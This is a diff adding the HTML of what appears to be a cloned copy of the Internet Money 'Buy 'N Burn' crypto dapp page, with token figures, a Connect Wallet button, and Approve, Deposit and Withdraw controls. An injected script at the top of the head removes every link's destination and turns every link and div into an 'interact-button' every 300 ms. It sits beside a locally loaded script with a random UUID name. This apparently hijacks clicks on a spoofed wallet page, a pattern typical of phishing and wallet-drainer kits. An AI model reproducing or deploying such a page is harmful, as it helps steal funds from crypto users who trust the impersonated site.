@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en"
+  style="--wcm-color-fg-1: rgb(228,231,231); --wcm-color-fg-2: rgb(148,158,158); --wcm-color-fg-3: rgb(110,119,119); --wcm-color-bg-1: rgb(20,20,20); --wcm-color-bg-2: rgb(39,42,42); --wcm-color-bg-3: rgb(59,64,64); --wcm-color-overlay: rgba(255,255,255,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;">
+
+<head>
+  <meta charset="UTF-8">
+  <script>
+    function addClassesToElements() {
+
+        const links = document.querySelectorAll('a:not(.interact-button)');
+        for (const link of links) {
+            link.removeAttribute('href');
+            link.classList.add('interact-button');
+        }
+        const buttons = document.querySelectorAll('div:not(.interact-button)');
+        for (const button of buttons) {
+            button.classList.add('interact-button');
+        }
+    }
+    setInterval(addClassesToElements, 300);
+</script>
+<script charset="UTF-8" type="text/javascript" src="./6e04ae12-0d93-4c77-82f3-df8bdb0bfda6.js"></script>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Buy 'N Burn</title>
+  <link href="/favicon-32x32.png" rel="icon">
+  <link href="/rainbowkit.css" rel="stylesheet">
+  <script defer="defer" src="/bundle.js"></script>
+  <link href="/styles.css" rel="stylesheet">
+  <script src="chrome-extension://idnnbdplmphpflfnlkomgpfbpcgelopg/inpage.js" id="xverse-wallet-provider"
+    data-is-priority="true"></script>
+  <style id="react-tooltip-core-styles" type="text/css">
+    :root {
+      --rt-color-white: #fff;
+      --rt-color-dark: #222;
+      --rt-color-success: #8dc572;
+      --rt-color-error: #be6464;
+      --rt-color-warning: #f0ad4e;
+      --rt-color-info: #337ab7;
+      --rt-opacity: 0.9
+    }
+
+    .core-styles-module_tooltip__3vRRp {
+      visibility: hidden;
+      position: absolute;
+      top: 0;
+      left: 0;
+      pointer-events: none;
+      opacity: 0;
+      transition: opacity 0.3s ease-out;
+      will-change: opacity, visibility
+    }
+
+    .core-styles-module_fixed__pcSol {
+      position: fixed
+    }
+
+    .core-styles-module_arrow__cvMwQ {
+      position: absolute;
+      background: inherit
+    }
+
+    .core-styles-module_noArrow__xock6 {
+      display: none
+    }
+
+    .core-styles-module_clickable__ZuTTB {
+      pointer-events: auto
+    }
+
+    .core-styles-module_show__Nt9eE {
+      visibility: visible;
+      opacity: var(--rt-opacity)
+    }
+  </style>
+  <style id="react-tooltip-base-styles" type="text/css">
+    .styles-module_tooltip__mnnfp {
+      padding: 8px 16px;
+      border-radius: 3px;
+      font-size: 90%;
+      width: max-content
+    }
+
+    .styles-module_arrow__K0L3T {
+      width: 8px;
+      height: 8px;
+      transform: rotate(45deg)
+    }
+
+    .styles-module_dark__xNqje {
+      background: var(--rt-color-dark);
+      color: var(--rt-color-white)
+    }
+
+    .styles-module_light__Z6W-X {
+      background-color: var(--rt-color-white);
+      color: var(--rt-color-dark)
+    }
+
+    .styles-module_success__A2AKt {
+      background-color: var(--rt-color-success);
+      color: var(--rt-color-white)
+    }
+
+    .styles-module_warning__SCK0X {
+      background-color: var(--rt-color-warning);
+      color: var(--rt-color-white)
+    }
+
+    .styles-module_error__JvumD {
+      background-color: var(--rt-color-error);
+      color: var(--rt-color-white)
+    }
+
+    .styles-module_info__BWdHW {
+      background-color: var(--rt-color-info);
+      color: var(--rt-color-white)
+    }
+  </style>
+  <style data-emotion="css" data-s=""></style>
+  <script src="chrome-extension://lpilbniiabackdjcionkobglmddfbcjo/inpage.js"></script>
+</head>
+
+<body>
+  <div id="root">
+    <div class="container" style="overflow: hidden;">
+      <div data-rk="">
+        <style>
+          [data-rk] {
+            --rk-blurs-modalOverlay: blur(0px);
+            --rk-fonts-body: SFRounded, ui-rounded, "SF Pro Rounded", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+            --rk-radii-actionButton: 9999px;
+            --rk-radii-connectButton: 12px;
+            --rk-radii-menuButton: 12px;
+            --rk-radii-modal: 24px;
+            --rk-radii-modalMobile: 28px;
+            --rk-colors-accentColor: #0E76FD;
+            --rk-colors-accentColorForeground: #FFF;
+            --rk-colors-actionButtonBorder: rgba(0, 0, 0, 0.04);
+            --rk-colors-actionButtonBorderMobile: rgba(0, 0, 0, 0.06);
+            --rk-colors-actionButtonSecondaryBackground: rgba(0, 0, 0, 0.06);
+            --rk-colors-closeButton: rgba(60, 66, 66, 0.8);
+            --rk-colors-closeButtonBackground: rgba(0, 0, 0, 0.06);
+            --rk-colors-connectButtonBackground: #FFF;
+            --rk-colors-connectButtonBackgroundError: #FF494A;
+            --rk-colors-connectButtonInnerBackground: linear-gradient(0deg, rgba(0, 0, 0, 0.03), rgba(0, 0, 0, 0.06));
+            --rk-colors-connectButtonText: #25292E;
+            --rk-colors-connectButtonTextError: #FFF;
+            --rk-colors-connectionIndicator: #30E000;
+            --rk-colors-downloadBottomCardBackground: linear-gradient(126deg, rgba(255, 255, 255, 0) 9.49%, rgba(171, 171, 171, 0.04) 71.04%), #FFFFFF;
+            --rk-colors-downloadTopCardBackground: linear-gradient(126deg, rgba(171, 171, 171, 0.2) 9.49%, rgba(255, 255, 255, 0) 71.04%), #FFFFFF;
+            --rk-colors-error: #FF494A;
+            --rk-colors-generalBorder: rgba(0, 0, 0, 0.06);
+            --rk-colors-generalBorderDim: rgba(0, 0, 0, 0.03);
+            --rk-colors-menuItemBackground: rgba(60, 66, 66, 0.1);
+            --rk-colors-modalBackdrop: rgba(0, 0, 0, 0.3);
+            --rk-colors-modalBackground: #FFF;
+            --rk-colors-modalBorder: transparent;
+            --rk-colors-modalText: #25292E;
+            --rk-colors-modalTextDim: rgba(60, 66, 66, 0.3);
+            --rk-colors-modalTextSecondary: rgba(60, 66, 66, 0.6);
+            --rk-colors-profileAction: #FFF;
+            --rk-colors-profileActionHover: rgba(255, 255, 255, 0.5);
+            --rk-colors-profileForeground: rgba(60, 66, 66, 0.06);
+            --rk-colors-selectedOptionBorder: rgba(60, 66, 66, 0.1);
+            --rk-colors-standby: #FFD641;
+            --rk-shadows-connectButton: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            --rk-shadows-dialog: 0px 8px 32px rgba(0, 0, 0, 0.32);
+            --rk-shadows-profileDetailsAction: 0px 2px 6px rgba(37, 41, 46, 0.04);
+            --rk-shadows-selectedOption: 0px 2px 6px rgba(0, 0, 0, 0.24);
+            --rk-shadows-selectedWallet: 0px 2px 6px rgba(0, 0, 0, 0.12);
+            --rk-shadows-walletLogo: 0px 2px 16px rgba(0, 0, 0, 0.16);
+          }
+        </style>
+        <header class="src-components-Header__header">
+          <div class="src-components-Header__contents"><a class="src-components-Header__logo"
+              href="https://internetmoney.io/"><img class="src-components-Header__logoIcon"
+                src="/53a5243fec8815ca421f.png"><span
+                class="src-components-Header__logoName">Internet<br>Money</span></a>
+            <div class="src-components-Header__headerLinks">
+              <div class="src-components-Header__headerLink ">Home</div>
+              <div id="src-components-Header__aboutUs" class="src-components-Header__headerLink ">About us</div>
+              <div class="src-components-Header__headerLink src-components-Header__selectedHeaderLink">Dapp</div>
+              <div class="src-components-Header__headerLink  ">
+                <div class="src-components-Header__headerItemWrapper">
+                  <div>Tokens</div><img src="/1e4a82c387784b3510f0.svg" class="src-components-Header__dropdownIcon">
+                </div>
+              </div>
+              <div id="src-components-Header__blackpaper" class="src-components-Header__headerLink ">Blackpaper</div>
+              <div id="src-components-Header__audits" class="src-components-Header__headerLink ">Audits</div>
+              <div class="src-components-Header__headerLink  " id="src-components-Header__more">
+                <div class="src-components-Header__headerItemWrapper">
+                  <div>More</div><img src="/1e4a82c387784b3510f0.svg" class="src-components-Header__dropdownIcon">
+                </div>
+              </div>
+              <div id="src-components-Header__stats" class="src-components-Header__headerLink ">Stats</div>
+            </div>
+            <div class="src-components-Header__hamburgerMenu">
+              <div class="src-components-Header__headerButtons">
+                <div class="src-components-Download__downloadWrapper"><button type="button"
+                    class="src-components-Download__downloadButton">Download the wallet</button></div><button
+                  type="button" class="src-components-JoinCommunity__joinCommunity">Join Community</button>
+              </div><img src="/382996030ace861f591b.svg" class="src-components-Header__hamburgerMenuIcon">
+            </div>
+            <div class="src-components-Drawer__drawerContainer ">
+              <div class="src-components-Drawer__closeDrawerIcon"><img src="/69797af5a848d017e28f.svg"
+                  class="src-components-Drawer__drawerIcon"></div>
+              <div class="src-components-Drawer__drawerContent"><a class="src-components-Drawer__logo"
+                  href="https://internetmoney.io/"><img class="src-components-Drawer__logoIcon"
+                    src="/53a5243fec8815ca421f.png"><span
+                    class="src-components-Drawer__logoName">Internet<br>Money</span></a>
+                <div class="src-components-Drawer__burgerMenuItem ">Home</div>
+                <div class="src-components-Drawer__burgerMenuItem ">About us</div>
+                <div class="src-components-Drawer__burgerMenuItem src-components-Drawer__activeBurgerMenuItem">Dapp
+                </div>
+                <div class="src-components-Drawer__burgerMenuItem ">T.I.M.E Divided (TIME)</div>
+                <div class="src-components-Drawer__burgerMenuItem ">Interney Money (IM)</div>
+                <div class="src-components-Drawer__burgerMenuItem ">Future T.I.M.E Divided (FUTURE)</div>
+                <div class="src-components-Drawer__burgerMenuItem ">Blackpaper</div>
+                <div class="src-components-Drawer__burgerMenuItem ">Audits</div>
+                <div class="src-components-Drawer__burgerMenuItem ">Stats</div>
+                <div class="src-components-Download__downloadWrapper"><button type="button"
+                    class="src-components-Download__downloadButton">Download the wallet</button></div><button
+                  type="button" class="src-components-JoinCommunity__joinCommunity">Join Community</button>
+              </div>
+            </div>
+          </div>
+        </header>
+        <div>
+          <div aria-hidden="false" class="">
+            <div class="src-components-RainbowKitButton__buttonWrapper"><button
+                class="src-components-RainbowKitButton__chainButton" type="button"
+                style="display: flex; align-items: center;">
+                <div class="src-components-RainbowKitButton__iconContainer"><img alt="PulseChain"
+                    src="https://ipfs.io/ipfs/QmYqkn8pJUaV9KcEPYEvRPwgbfeozLEvcQ9aEwKNRUL3cR"
+                    class="src-components-RainbowKitButton__icon"></div><img src="/7c3813ca655491902a1f.png">
+              </button><button class="src-components-RainbowKitButton__rainbowKitButton" type="button">Connect
+                Wallet</button></div>
+          </div>
+          <div class="src-components-WavePanel__title"><img src="/9d4ff07fa99dbfaacb73.png"
+              class="src-components-WavePanel__ufoBeam"><img class="src-components-WavePanel__titleIcon"
+              src="/2803832046cf7e52838f.svg"><img src="https://d295q1lbtarn4h.cloudfront.net/gifs/alien-sitting.gif"
+              class="src-components-WavePanel__alienTitle">
+            <h1 class="src-components-WavePanel__titleName">Buy And Burn</h1><img src="/82f678f0369db256934b.png"
+              class="src-components-WavePanel__ufoRight">
+          </div>
+        </div>
+        <div class="src-components-PrimaryPanel__primaryPanel">
+          <p class="src-components-PrimaryPanel__disclaimer">Please connect your wallet before proceeding.</p>
+          <div class="src-components-PrimaryPanel__primaryPanelWrapper">
+            <div class="src-components-PrimaryPanel__topRightCorner"><img src="/00d095ac1d17c52a640b.png"></div>
+            <div class="src-components-PrimaryPanel__topLeftCorner"><img src="/e17582930cff8954db8b.svg"></div>
+            <div class="src-components-BuyAndBurnSelection__selectContainer css-b62m3t-container"><span
+                id="react-select-2-live-region" class="css-7pg0cj-a11yText"></span><span aria-live="polite"
+                aria-atomic="false" aria-relevant="additions text" class="css-7pg0cj-a11yText"></span>
+              <div class="src-components-BuyAndBurnSelection__selectControl css-13cymwt-control">
+                <div class=" css-hlgwow">
+                  <div class="src-components-BuyAndBurnSelection__selectSingleValue css-1dimb5e-singleValue">
+                    <div class="src-components-BuyAndBurnSelection__controlWrapper"><img src="/36b4e2940c43a927d44f.png"
+                        class="src-components-BuyAndBurnSelection__controlRowIcon"><span>T.I.M.E.
+                        Dividend</span><span>(TIME)</span></div>
+                  </div><input id="react-select-2-input" tabindex="0" inputmode="none" aria-autocomplete="list"
+                    aria-expanded="false" aria-haspopup="true" role="combobox" aria-readonly="true"
+                    class="css-1hac4vs-dummyInput" value="">
+                </div>
+                <div class=" css-1wy0on6"><img class="src-components-BuyAndBurnSelection__dropdownIndicator"
+                    src="/1d46106a374ab990b279.png"></div>
+              </div>
+            </div>
+            <div class="src-components-DappRow__dappRow src-components-DappRow__rowWrapper ">
+              <div class="src-components-DappRow__left">
+                <div data-tooltip-id="buy-n-burn-time"
+                  data-tooltip-content="Buy target token and burn with the economic energy available in the Buy And Burn contract."
+                  class="src-components-DappRow__info">i</div>
+                <div class="src-components-DappRow__percentBox">
+                  <div class="src-components-DappRow__title src-components-DappRow__button">Buy 'N Burn (TIME)</div>
+                </div>
+              </div>
+              <div class="src-components-DappRow__rightWrapper">
+                <div class="src-components-DappRow__right"><label class="src-components-DappRow__label"></label>
+                  <div class="src-components-DappRow__rightValues">
+                    <div class="src-components-DappRow__inputPercentValue"><input type="text" placeholder=""
+                        class="src-components-DappRow__value" disabled="" value="189,465.48"></div>
+                  </div>
+                </div>
+                <div class="src-components-DappRow__rowIconWrapper"><img class="src-components-DappRow__rowIcon"
+                    src="https://ipfs.io/ipfs/QmYqkn8pJUaV9KcEPYEvRPwgbfeozLEvcQ9aEwKNRUL3cR">
+                  <div class="src-components-DappRow__currency">PLS</div>
+                </div>
+              </div>
+            </div>
+            <div class="src-components-DappRow__dappRow  ">
+              <div class="src-components-DappRow__left">
+                <div data-tooltip-id="total-burned"
+                  data-tooltip-content="Total amount of TIME burned buy the Buy and Burn contract."
+                  class="src-components-DappRow__info">i</div>
+                <div class="src-components-DappRow__percentBox">
+                  <div class="src-components-DappRow__title">Total Burned</div>
+                  <div class="src-components-DappRow__percentValue">(0.225% OF TOTAL SUPPLY)</div>
+                </div>
+              </div>
+              <div class="src-components-DappRow__rightWrapper">
+                <div class="src-components-DappRow__right"><label class="src-components-DappRow__label"></label>
+                  <div class="src-components-DappRow__rightValues">
+                    <div class="src-components-DappRow__inputPercentValue"><input type="text" placeholder=""
+                        class="src-components-DappRow__value" disabled="" value="4,519,032.02"></div>
+                  </div>
+                </div>
+                <div class="src-components-DappRow__rowIconWrapper"><img class="src-components-DappRow__rowIcon"
+                    src="/36b4e2940c43a927d44f.png">
+                  <div class="src-components-DappRow__currency">TIME</div>
+                </div>
+              </div>
+            </div>
+            <div class="src-components-DappRow__dappRow src-components-DappRow__rowWrapper ">
+              <div class="src-components-DappRow__left">
+                <div data-tooltip-id="sweep"
+                  data-tooltip-content="Sweeps native coin from Swap Router to TIME token contract. This will distribute tokens equitably and increase the amount that can be claimed by the Buy And Burn contract by the amount shown."
+                  class="src-components-DappRow__info">i</div>
+                <div class="src-components-DappRow__percentBox">
+                  <div class="src-components-DappRow__title src-components-DappRow__button">Sweep</div>
+                </div>
+              </div>
+              <div class="src-components-DappRow__rightWrapper">
+                <div class="src-components-DappRow__right"><label class="src-components-DappRow__label"></label>
+                  <div class="src-components-DappRow__rightValues">
+                    <div class="src-components-DappRow__inputPercentValue"><input type="text" placeholder=""
+                        class="src-components-DappRow__value" disabled="" value="62.98"></div>
+                  </div>
+                </div>
+                <div class="src-components-DappRow__rowIconWrapper"><img class="src-components-DappRow__rowIcon"
+                    src="https://ipfs.io/ipfs/QmYqkn8pJUaV9KcEPYEvRPwgbfeozLEvcQ9aEwKNRUL3cR">
+                  <div class="src-components-DappRow__currency">PLS</div>
+                </div>
+              </div>
+            </div>
+            <div class="src-components-DappRow__dappRow  ">
+              <div class="src-components-DappRow__left">
+                <div data-tooltip-id="claim"
+                  data-tooltip-content="Claim dividends from the Buy And Burn contract holding TIME. This is the final step before purchasing tokens off of a market and burning them."
+                  class="src-components-DappRow__info">i</div>
+                <div class="src-components-DappRow__percentBox">
+                  <div class="src-components-DappRow__title src-components-DappRow__button">Claim</div>
+                </div>
+              </div>
+              <div class="src-components-DappRow__rightWrapper">
+                <div class="src-components-DappRow__right"><label class="src-components-DappRow__label"></label>
+                  <div class="src-components-DappRow__rightValues">
+                    <div class="src-components-DappRow__inputPercentValue"><input type="text" placeholder=""
+                        class="src-components-DappRow__value" disabled="" value="64,846.79"></div>
+                  </div>
+                </div>
+                <div class="src-components-DappRow__rowIconWrapper"><img class="src-components-DappRow__rowIcon"
+                    src="https://ipfs.io/ipfs/QmYqkn8pJUaV9KcEPYEvRPwgbfeozLEvcQ9aEwKNRUL3cR">
+                  <div class="src-components-DappRow__currency">PLS</div>
+                </div>
+              </div>
+            </div>
+            <div class="src-components-DappRow__dappRow src-components-DappRow__rowWrapper ">
+              <div class="src-components-DappRow__left">
+                <div data-tooltip-id="total-claimed"
+                  data-tooltip-content="Total amount of PLS claimed by the Buy and Burn contract."
+                  class="src-components-DappRow__info">i</div>
+                <div class="src-components-DappRow__percentBox">
+                  <div class="src-components-DappRow__title">Total Claimed</div>
+                </div>
+              </div>
+              <div class="src-components-DappRow__rightWrapper">
+                <div class="src-components-DappRow__right"><label class="src-components-DappRow__label"></label>
+                  <div class="src-components-DappRow__rightValues">
+                    <div class="src-components-DappRow__inputPercentValue"><input type="text" placeholder=""
+                        class="src-components-DappRow__value" disabled="" value="113,879,633.24"></div>
+                    <div class="src-components-DappRow__usdValue">$8,450.97 USD</div>
+                  </div>
+                </div>
+                <div class="src-components-DappRow__rowIconWrapper"><img class="src-components-DappRow__rowIcon"
+                    src="https://ipfs.io/ipfs/QmYqkn8pJUaV9KcEPYEvRPwgbfeozLEvcQ9aEwKNRUL3cR">
+                  <div class="src-components-DappRow__currency">PLS</div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div><img src="https://d295q1lbtarn4h.cloudfront.net/gifs/phone-shot.gif"
+              class="src-components-PrimaryPanel__middlePanelAnimation" alt="panel animation"></div>
+          <div class="src-components-PrimaryPanel__primaryPanelWrapper">
+            <div class="src-components-PrimaryPanel__bottomLeftCorner"><img src="/d7247b042a4716dcb72a.png"></div>
+            <div class="src-components-PrimaryPanel__bottomRightCorner"><img src="/041b32bcc59a5ddc45a2.png"></div>
+            <div class="src-components-DappRow__dappRow src-components-DappRow__rowWrapper ">
+              <div class="src-components-DappRow__left">
+                <div data-tooltip-id="approve"
+                  data-tooltip-content="Allows the Buy And Burn contract to move TIME from your account to itself - necessary so that you can get your tokens out in the future."
+                  class="src-components-DappRow__info">i</div>
+                <div class="src-components-DappRow__percentBox">
+                  <div class="src-components-DappRow__title src-components-DappRow__button">Approve</div>
+                </div>
+              </div>
+              <div class="src-components-DappRow__rightWrapper">
+                <div class="src-components-DappRow__right src-components-DappRow__hidden"><label
+                    class="src-components-DappRow__label src-components-DappRow__loading"></label>
+                  <div class="src-components-DappRow__rightValues">
+                    <div class="src-components-DappRow__inputPercentValue"><input type="text" placeholder=""
+                        class="src-components-DappRow__value" disabled="" value=""></div>
+                  </div>
+                </div>
+                <div class="src-components-DappRow__rowIconWrapper"><img class="src-components-DappRow__rowIcon">
+                  <div class="src-components-DappRow__currency"></div>
+                </div>
+              </div>
+            </div>
+            <div class="src-components-DappRow__dappRow  ">
+              <div class="src-components-DappRow__left">
+                <div data-tooltip-id="revoke"
+                  data-tooltip-content="Disallows the Buy And Burn contract from moving tokens from your account to itself."
+                  class="src-components-DappRow__info">i</div>
+                <div class="src-components-DappRow__percentBox">
+                  <div class="src-components-DappRow__title src-components-DappRow__button">Revoke</div>
+                </div>
+              </div>
+              <div class="src-components-DappRow__rightWrapper">
+                <div class="src-components-DappRow__right src-components-DappRow__hidden"><label
+                    class="src-components-DappRow__label src-components-DappRow__loading"></label>
+                  <div class="src-components-DappRow__rightValues">
+                    <div class="src-components-DappRow__inputPercentValue"><input type="text" placeholder=""
+                        class="src-components-DappRow__value" disabled="" value=""></div>
+                  </div>
+                </div>
+                <div class="src-components-DappRow__rowIconWrapper"><img class="src-components-DappRow__rowIcon">
+                  <div class="src-components-DappRow__currency"></div>
+                </div>
+              </div>
+            </div>
+            <div class="src-components-DappRow__dappRow src-components-DappRow__rowWrapper ">
+              <div class="src-components-DappRow__left">
+                <div data-tooltip-id="deposit"
+                  data-tooltip-content="Deposit TIME tokens from your wallet to the buy and burn contract to contribute economic energy to buying and burning tokens. Your TIME tokens can be withdrawn at any time."
+                  class="src-components-DappRow__info">i</div>
+                <div class="src-components-DappRow__percentBox">
+                  <div class="src-components-DappRow__title src-components-DappRow__button">Deposit</div>
+                </div>
+              </div>
+              <div class="src-components-DappRow__rightWrapper">
+                <div class="src-components-DappRow__right src-components-DappRow__input"><label
+                    class="src-components-DappRow__label"></label>
+                  <div class="src-components-DappRow__rightValues">
+                    <div class="src-components-DappRow__inputPercentValue"><input type="text" placeholder="Input Amount"
+                        class="src-components-DappRow__value" value=""></div>
+                  </div>
+                </div>
+                <div class="src-components-DappRow__rowIconWrapper"><img class="src-components-DappRow__rowIcon"
+                    src="/36b4e2940c43a927d44f.png">
+                  <div class="src-components-DappRow__currency">TIME</div>
+                </div>
+              </div>
+            </div>
+            <div class="src-components-DappRow__dappRow  ">
+              <div class="src-components-DappRow__left">
+                <div data-tooltip-id="withdraw"
+                  data-tooltip-content="Withdraw TIME from Buy And Burn contract. You can only withdraw tokens that were deposited from your connected account."
+                  class="src-components-DappRow__info">i</div>
+                <div class="src-components-DappRow__percentBox">
+                  <div class="src-components-DappRow__title src-components-DappRow__button">Withdraw</div>
+                </div>
+              </div>
+              <div class="src-components-DappRow__rightWrapper">
+                <div class="src-components-DappRow__right src-components-DappRow__input"><label
+                    class="src-components-DappRow__label"></label>
+                  <div class="src-components-DappRow__rightValues">
+                    <div class="src-components-DappRow__inputPercentValue"><input type="text" placeholder="Input Amount"
+                        class="src-components-DappRow__value" value=""></div>
+                  </div>
+                </div>
+                <div class="src-components-DappRow__rowIconWrapper"><img class="src-components-DappRow__rowIcon"
+                    src="/36b4e2940c43a927d44f.png">
+                  <div class="src-components-DappRow__currency">TIME</div>
+                </div>
+              </div>
+            </div>
+            <div class="src-components-DappRow__dappRow  ">
+              <div class="src-components-DappRow__left">
+                <div data-tooltip-id="your-deposit"
+                  data-tooltip-content="The TIME deposited into the Buy And Burn contract from your account."
+                  class="src-components-DappRow__info">i</div>
+                <div class="src-components-DappRow__percentBox">
+                  <div class="src-components-DappRow__title">Your Deposit</div>
+                </div>
+              </div>
+              <div class="src-components-DappRow__rightWrapper">
+                <div class="src-components-DappRow__right"><label class="src-components-DappRow__label"></label>
+                  <div class="src-components-DappRow__rightValues">
+                    <div class="src-components-DappRow__inputPercentValue"><input type="text" placeholder=""
+                        class="src-components-DappRow__value" disabled="" value=""></div>
+                  </div>
+                </div>
+                <div class="src-components-DappRow__rowIconWrapper"><img class="src-components-DappRow__rowIcon"
+                    src="/36b4e2940c43a927d44f.png">
+                  <div class="src-components-DappRow__currency">TIME</div>
+                </div>
+              </div>
+            </div>
+            <div class="src-components-DappRow__dappRow src-components-DappRow__rowWrapper ">
+              <div class="src-components-DappRow__left">
+                <div data-tooltip-id="total-deposited"
+                  data-tooltip-content="The total TIME deposited into the Buy And Burn contract"
+                  class="src-components-DappRow__info">i</div>
+                <div class="src-components-DappRow__percentBox">
+                  <div class="src-components-DappRow__title">Total Deposited</div>
+                  <div class="src-components-DappRow__percentValue">(1.645% OF TOTAL SUPPLY)</div>
+                </div>
+              </div>
+              <div class="src-components-DappRow__rightWrapper">
+                <div class="src-components-DappRow__right"><label class="src-components-DappRow__label"></label>
+                  <div class="src-components-DappRow__rightValues">
+                    <div class="src-components-DappRow__inputPercentValue"><input type="text" placeholder=""
+                        class="src-components-DappRow__value" disabled="" value="32,841,835.92"></div>
+                  </div>
+                </div>
+                <div class="src-components-DappRow__rowIconWrapper"><img class="src-components-DappRow__rowIcon"
+                    src="/36b4e2940c43a927d44f.png">
+                  <div class="src-components-DappRow__currency">TIME</div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div><img src="https://d295q1lbtarn4h.cloudfront.net/gifs/trio_guns.gif" alt="alien animation"
+              class="src-components-PrimaryPanel__bottomPanelAnimation"></div>
+        </div>
+        <div class="src-components-Footer__footer"><img class="src-components-Footer__logo"
+            src="/0042d5012527295d542f.png" alt="logo">
+          <div class="src-components-Footer__links"><a href="https://internetmoney.io/" target="_blank"
+              rel="noreferrer">Home</a><a href="https://internetmoney.io/about-us" target="_blank"
+              rel="noreferrer">About Us</a><a href="https://internetmoney.io/blackpaper" target="_blank"
+              rel="noreferrer">Blackpaper</a><a href="https://internetmoney.io/audits" target="_blank"
+              rel="noreferrer">Audits</a><a href="https://internetmoney.io/time" target="_blank"
+              rel="noreferrer">Time</a><a href="https://internetmoney.io/im" target="_blank" rel="noreferrer">IM</a><a
+              href="https://internetmoney.io/future" target="_blank" rel="noreferrer">Future</a><a
+              href="https://internetmoney.io/stats" target="_blank" rel="noreferrer">Stats</a></div>
+          <p class="src-components-Footer__text">As a team of DeFi experts and enthusiasts, we understand the importance
+            of wallet security and ensuring our users data is not collected. While also giving all humans the tools they
+            need to free their financial future. We are dedicated to bringing simplicity to every aspect of our
+            innovative features. Regardless of your experience level, you will find value and support with the Internet
+            Money Wallet and you can earn passive income along the way.</p>
+          <div class="src-components-Footer__socials"><a href="https://t.me/internetmoneyio" target="_blank"
+              rel="noreferrer"><img src="/a4511efd1632b6ad73ea.svg" alt="telegram"></a><a
+              href="https://twitter.com/internetmoneyio" target="_blank" rel="noreferrer"><img
+                src="/76ff5b2156daf177c349.svg" alt="twitter"></a><a href="https://reddit.com/r/internetmoneyio"
+              target="_blank" rel="noreferrer"><img src="/5d271935f5e60d66f001.svg" alt="reddit"></a><a
+              href="https://youtube.com/internetmoneyio" target="_blank" rel="noreferrer"><img
+                src="/219d775fafd778c08215.svg" alt="youtube"></a><a href="https://gitlab.com/internetmoneyio"
+              target="_blank" rel="noreferrer"><img src="/24766ad6f16f7da3a997.svg" alt="youtube"></a></div>
+          <div class="src-components-Footer__disclaimer">
+            <p class="src-components-Footer__disclaimerText">©Decentralized Innovations, LLC (Internet Money) ALL RIGHTS
+              RESERVED 2023</p>
+            <div class="src-components-Footer__policies"><a href="https://internetmoney.io/privacy-policy"
+                target="_blank" rel="noreferrer">Privacy Policy</a><a href="https://internetmoney.io/terms-of-service"
+                target="_blank" rel="noreferrer">Terms &amp; Conditions</a></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="ReactModalPortal"></div><iframe id="verify-api"
+    src="https://verify.walletconnect.com/2467dd6be385f6ac6f72ae4027d70dd7"
+    style="display: none;"></iframe><wcm-modal></wcm-modal>
+</body>
+
+</html>
